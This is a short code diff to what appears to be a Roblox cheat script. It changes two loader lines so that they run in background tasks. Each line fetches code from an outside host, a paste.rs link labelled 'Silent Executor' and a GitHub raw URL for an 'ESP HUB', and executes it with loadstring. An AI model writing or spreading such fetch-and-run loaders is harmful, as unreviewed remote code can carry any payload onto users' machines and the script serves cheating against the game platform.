@@ -310,8 +310,11 @@ else
     end)
 end
 
--- Silent Executor - Instant load
-loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://paste.rs/bnoxX"))()
+end)
 
--- ESP HUB - Also loads instantly now
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub3/XXXSCRIPT/refs/heads/main/EGG/ESP/HUB/V2"))()
+end)
+
